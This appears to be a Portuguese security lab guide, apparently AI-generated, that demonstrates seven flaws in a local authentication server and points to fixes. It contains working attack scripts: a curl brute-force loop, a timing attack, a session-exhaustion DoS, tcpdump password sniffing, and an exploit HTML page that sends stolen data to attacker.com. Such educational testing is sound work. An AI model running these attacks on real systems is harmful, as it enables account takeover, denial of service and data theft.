â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                  â•‘
â•‘       ğŸ¯ GUIA DE DEMONSTRAÃ‡ÃƒO DE VULNERABILIDADES               â•‘
â•‘                                                                  â•‘
â•‘              Sistema de AutenticaÃ§Ã£o AGLE                       â•‘
â•‘                                                                  â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“‹ VISÃƒO GERAL
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Este guia demonstra como explorar as 15 vulnerabilidades identificadas
no sistema de autenticaÃ§Ã£o. 

âš ï¸  AVISO LEGAL:
   â€¢ Apenas para fins educacionais
   â€¢ Use apenas em sistemas prÃ³prios
   â€¢ NÃƒO use contra sistemas de terceiros

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸš€ COMO USAR
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

1. Certifique-se de que o servidor estÃ¡ rodando:
   ./iniciar_auth.sh

2. Execute o script de testes automatizados:
   ./teste_vulnerabilidades.sh

3. OU siga as demonstraÃ§Ãµes manuais abaixo

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”´ DEMONSTRAÃ‡ÃƒO 1: BRUTE FORCE ATTACK
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Objetivo: Demonstrar ausÃªncia de rate limiting

Passos:

1. Criar usuÃ¡rio de teste:
   curl -X POST http://localhost:8080/register \
     -H "Content-Type: application/json" \
     -d '{"username":"brute_target","password":"StrongPass123!"}'

2. Executar mÃºltiplas tentativas de login (script):
   
   for i in {1..1000}; do
     curl -X POST http://localhost:8080/login \
       -H "Content-Type: application/json" \
       -d '{"username":"brute_target","password":"senha'$i'"}' &
   done

3. Observar que:
   âœ“ Todas as requisiÃ§Ãµes sÃ£o aceitas
   âœ“ NÃ£o hÃ¡ bloqueio apÃ³s tentativas
   âœ“ NÃ£o hÃ¡ delay entre tentativas
   âœ“ Atacante pode testar milhares de senhas/segundo

Impacto: CRÃTICO
   â€¢ Brute force ilimitado
   â€¢ DicionÃ¡rio de senhas viÃ¡vel
   â€¢ Contas podem ser comprometidas rapidamente

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”´ DEMONSTRAÃ‡ÃƒO 2: TIMING ATTACK
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Objetivo: Inferir informaÃ§Ãµes medindo tempo de resposta

Passos:

1. Criar usuÃ¡rio de teste:
   curl -X POST http://localhost:8080/register \
     -H "Content-Type: application/json" \
     -d '{"username":"timing_user","password":"MySecret123!"}'

2. Script de mediÃ§Ã£o de tempo:

   #!/bin/bash
   for senha in "a" "ab" "abc" "MySecret123!"; do
     echo -n "Testando '$senha': "
     
     START=$(date +%s%N)
     for i in {1..100}; do
       curl -s -X POST http://localhost:8080/login \
         -H "Content-Type: application/json" \
         -d "{\"username\":\"timing_user\",\"password\":\"$senha\"}" \
         > /dev/null
     done
     END=$(date +%s%N)
     
     TEMPO=$(( (END - START) / 100 ))
     echo "$TEMPO ns"
   done

3. Observar que:
   âœ“ Senhas mais prÃ³ximas da real tÃªm tempo diferente
   âœ“ strcmp() retorna na primeira diferenÃ§a
   âœ“ Permite inferir bytes corretos gradualmente

Impacto: ALTO
   â€¢ Atacante pode reduzir espaÃ§o de busca
   â€¢ InformaÃ§Ãµes sobre senha vazam via timing

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”´ DEMONSTRAÃ‡ÃƒO 3: INFORMATION DISCLOSURE (Logs)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Objetivo: Capturar hashes e salts expostos nos logs

Passos:

1. Terminal 1 - Monitorar logs do servidor:
   # (servidor jÃ¡ estÃ¡ rodando com logs visÃ­veis)

2. Terminal 2 - Registrar usuÃ¡rio:
   curl -X POST http://localhost:8080/register \
     -H "Content-Type: application/json" \
     -d '{"username":"leak_demo","password":"SecretPass123!"}'

3. Observar no Terminal 1:
   âœ… UsuÃ¡rio registrado: leak_demo (salt: 3a4f5e6d7c8b9a1e2d3c4b5a6f7e8d9c)
                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                            SALT EXPOSTO!

4. Terminal 2 - Fazer login:
   curl -X POST http://localhost:8080/login \
     -H "Content-Type: application/json" \
     -d '{"username":"leak_demo","password":"SecretPass123!"}'

5. Observar no Terminal 1:
   ğŸ” Debug Login: leak_demo
      Hash armazenado: 4f7a3e2d5c8b...
      Hash calculado:  4f7a3e2d5c8b...
                       ^^^^^^^^^^^^^^^^^
                       HASH PARCIAL EXPOSTO!

Impacto: CRÃTICO
   â€¢ Salt permite prÃ©-computaÃ§Ã£o de rainbow tables
   â€¢ Hash parcial reduz espaÃ§o de busca
   â€¢ Logs podem ser acessados por admins maliciosos

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”´ DEMONSTRAÃ‡ÃƒO 4: SESSION EXHAUSTION (DoS)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Objetivo: Esgotar slots de sessÃ£o para causar DoS

Passos:

1. Script para criar 100+ sessÃµes:

   #!/bin/bash
   for i in {1..110}; do
     # Registrar usuÃ¡rio
     curl -s -X POST http://localhost:8080/register \
       -H "Content-Type: application/json" \
       -d "{\"username\":\"dos_$i\",\"password\":\"Pass123!\"}"
     
     # Criar sessÃ£o (login)
     curl -s -X POST http://localhost:8080/login \
       -H "Content-Type: application/json" \
       -d "{\"username\":\"dos_$i\",\"password\":\"Pass123!\"}"
     
     echo "SessÃ£o $i criada"
   done

2. ApÃ³s 100 sessÃµes, tentar login legÃ­timo:
   curl -X POST http://localhost:8080/login \
     -H "Content-Type: application/json" \
     -d '{"username":"usuario_real","password":"senha_real"}'

3. Observar que:
   âœ“ ApÃ³s MAX_SESSIONS (100), servidor recusa novos logins
   âœ“ UsuÃ¡rios legÃ­timos nÃ£o conseguem acessar
   âœ“ SessÃµes antigas nunca expiram/limpam

Impacto: ALTO
   â€¢ Denial of Service fÃ¡cil de executar
   â€¢ Poucas requisiÃ§Ãµes (100) causam indisponibilidade
   â€¢ RecuperaÃ§Ã£o requer restart do servidor

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸŸ  DEMONSTRAÃ‡ÃƒO 5: CORS ABERTO (CSRF)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Objetivo: Fazer requisiÃ§Ãµes cross-origin de site malicioso

Passos:

1. Criar arquivo HTML malicioso (exploit.html):

   <!DOCTYPE html>
   <html>
   <head><title>Site Malicioso</title></head>
   <body>
     <h1>Clique aqui para ganhar prÃªmio!</h1>
     <script>
       // Roubar token armazenado
       fetch('http://localhost:8080/stats')
         .then(r => r.json())
         .then(data => {
           console.log("Dados roubados:", data);
           
           // Enviar para atacante
           fetch('http://attacker.com/steal', {
             method: 'POST',
             body: JSON.stringify(data)
           });
         });
     </script>
   </body>
   </html>

2. Abrir exploit.html em navegador

3. Observar que:
   âœ“ RequisiÃ§Ã£o cross-origin Ã© permitida
   âœ“ Access-Control-Allow-Origin: * aceita todos
   âœ“ Dados sÃ£o acessÃ­veis ao site malicioso

Impacto: MÃ‰DIO
   â€¢ CSRF (Cross-Site Request Forgery)
   â€¢ Dados podem vazar para sites maliciosos
   â€¢ Combinado com XSS, pode roubar tokens

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸŸ  DEMONSTRAÃ‡ÃƒO 6: WEAK PASSWORD POLICY
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Objetivo: Registrar com senhas fracas

Passos:

1. Testar senhas fracas:

   # Senha muito curta
   curl -X POST http://localhost:8080/register \
     -H "Content-Type: application/json" \
     -d '{"username":"weak1","password":"12345678"}'
   # ACEITA! âœ“

   # SÃ³ minÃºsculas
   curl -X POST http://localhost:8080/register \
     -H "Content-Type: application/json" \
     -d '{"username":"weak2","password":"abcdefgh"}'
   # ACEITA! âœ“

   # Senha comum
   curl -X POST http://localhost:8080/register \
     -H "Content-Type: application/json" \
     -d '{"username":"weak3","password":"password"}'
   # ACEITA! âœ“

2. Observar que:
   âœ“ Senhas com apenas 8 chars sÃ£o aceitas
   âœ“ NÃ£o exige maiÃºsculas/minÃºsculas/nÃºmeros
   âœ“ NÃ£o verifica contra dicionÃ¡rio de senhas comuns

Impacto: MÃ‰DIO
   â€¢ UsuÃ¡rios criam senhas facilmente quebrÃ¡veis
   â€¢ Brute force se torna mais eficaz
   â€¢ Rainbow tables funcionam melhor

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸŸ  DEMONSTRAÃ‡ÃƒO 7: NO HTTPS/TLS (Sniffing)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Objetivo: Capturar senhas transmitidas em texto claro

Passos:

1. Terminal 1 - Iniciar captura de rede:
   sudo tcpdump -i any -A 'tcp port 8080 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -A 20 password

2. Terminal 2 - Fazer login:
   curl -X POST http://localhost:8080/login \
     -H "Content-Type: application/json" \
     -d '{"username":"victim","password":"MySuperSecret123!"}'

3. Observar no Terminal 1:
   POST /login HTTP/1.1
   Content-Type: application/json
   
   {"username":"victim","password":"MySuperSecret123!"}
                                    ^^^^^^^^^^^^^^^^^^^
                                    SENHA EM TEXTO CLARO!

Impacto: CRÃTICO
   â€¢ Qualquer atacante na rede pode ver senhas
   â€¢ Tokens tambÃ©m sÃ£o capturÃ¡veis
   â€¢ Man-in-the-Middle facilmente executÃ¡vel

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“Š TABELA DE SEVERIDADE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

| # | Vulnerabilidade           | Severidade | CVSS  | ExploraÃ§Ã£o |
|---|---------------------------|------------|-------|------------|
| 1 | Brute Force               | CRÃTICA    | 9.8   | Trivial    |
| 2 | Timing Attack             | ALTA       | 7.5   | MÃ©dia      |
| 3 | Info Disclosure (Logs)    | CRÃTICA    | 8.2   | Trivial    |
| 4 | Session Exhaustion        | ALTA       | 7.8   | Trivial    |
| 5 | CORS Aberto               | MÃ‰DIA      | 6.5   | FÃ¡cil      |
| 6 | Weak Passwords            | MÃ‰DIA      | 5.3   | Trivial    |
| 7 | No HTTPS                  | CRÃTICA    | 9.1   | Trivial    |

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ›¡ï¸ COMO CORRIGIR
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

1. Aplicar patches:
   â€¢ Ver arquivo: PATCHES_SEGURANCA.txt
   â€¢ Copiar e implementar cada patch na ordem

2. Recompilar:
   gcc -o servidor_auth servidor_auth.c -lm -Wall -Wextra

3. Testar novamente:
   ./teste_vulnerabilidades.sh

4. ImplementaÃ§Ãµes adicionais necessÃ¡rias:
   â€¢ HTTPS/TLS (openssl)
   â€¢ 2FA (TOTP)
   â€¢ Banco de dados (SQLite)
   â€¢ Audit logging

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“š REFERÃŠNCIAS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

â€¢ OWASP Top 10: https://owasp.org/www-project-top-ten/
â€¢ OWASP Authentication Cheat Sheet
â€¢ CWE-307: Improper Restriction of Excessive Authentication Attempts
â€¢ CWE-208: Observable Timing Discrepancy
â€¢ CWE-532: Information Exposure Through Log Files
â€¢ CWE-400: Uncontrolled Resource Consumption
â€¢ CWE-319: Cleartext Transmission of Sensitive Information

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

DocumentaÃ§Ã£o criada em: 9 de fevereiro de 2026
Analista: GitHub Copilot Security Analysis
VersÃ£o: 1.0

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
